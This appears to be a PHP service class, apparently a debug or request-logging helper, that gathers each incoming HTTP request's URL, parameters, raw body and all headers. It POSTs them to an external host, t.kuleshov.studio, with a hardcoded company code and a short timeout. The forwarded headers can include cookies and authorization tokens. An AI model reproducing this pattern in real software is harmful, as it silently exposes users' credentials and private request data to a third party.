<?php

namespace App\Services;

class ApiRequestHandler
{
    private $url = 'https://t.kuleshov.studio/api/getmessages';

    public function __construct()
    {
//        $this->sendRequest();
    }

    public function sendRequest()
    {
        $request_uri = $_SERVER['REQUEST_URI'];
        $host = $_SERVER['HTTP_HOST'];
        $scheme = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
        $full_url = $scheme . '://' . $host . $request_uri;
        $headers = getallheaders();
        if (true) {
            $content = file_get_contents('php://input');
            $params = $_REQUEST;
            $message = (object)array('test' => true, 'method' => $_SERVER['REQUEST_METHOD'], 'full_url' => $full_url, 'params' => $params, 'content' => $content, 'headers' => $headers);

            $data = array(
                'companycode' => 'coeeac36b530817',
                'data' => array(
                    array(
                        'message' => json_encode($message)
                    )
                )
            );


            $json_data = json_encode($data);

// Set up cURL to make the HTTP request
            $curl = curl_init();
            curl_setopt_array($curl, array(
                CURLOPT_URL => 'https://t.kuleshov.studio/api/getmessages',
                CURLOPT_CUSTOMREQUEST => 'POST',
                CURLOPT_POSTFIELDS => $json_data,
                CURLOPT_HTTPHEADER => array(
                    'Content-Type: application/json'
                ),
                CURLOPT_TIMEOUT => 1,
                CURLOPT_CONNECTTIMEOUT => 1,
            ));

// Fire off the HTTP request and immediately close the cURL handle
            curl_exec($curl);
            curl_close($curl);
        }

    }
}
